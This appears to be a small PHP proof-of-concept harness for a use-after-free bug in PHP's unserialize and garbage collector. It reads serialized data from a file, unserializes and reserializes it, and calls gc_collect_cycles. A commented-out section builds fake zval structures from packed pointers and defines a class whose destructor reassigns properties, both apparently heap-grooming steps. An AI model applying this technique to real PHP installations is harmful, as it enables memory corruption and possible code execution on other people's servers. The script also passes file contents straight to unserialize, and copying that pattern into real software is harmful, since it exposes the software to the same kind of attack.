<?php
	if ($argc != 2) {
		print_r("" . $argv[0] . " path/to/data\n");
		return;
	}

	$poc = unserialize(file_get_contents($argv[1]));

	serialize($poc);

	//echo serialize($poc);

	gc_collect_cycles();
/*	$fakezval = ptr2str(1122334455);
	$fakezval .= ptr2str(0);
	$fakezval .= "\x00\x00\x00\x00";
	$fakezval .= "\x01";
	$fakezval .= "\x00";
	$fakezval .= "\x00\x00";
	for ($i = 0; $i < 5; $i++) {
		$v[$i] = $fakezval.$i;
	}

	echo "\n";

	var_dump($poc);

	class ryat
	{
		var $ryat;
		var $chtg;
		
		function __destruct()
		{
			$this->chtg = $this->ryat;
		}
	}

	function ptr2str($ptr)
	{
		$out = '';
		for ($i = 0; $i < 8; $i++) {
			$out .= chr($ptr & 0xff);
			$ptr >>= 8;
		}
		return $out;
	}
*/

?>
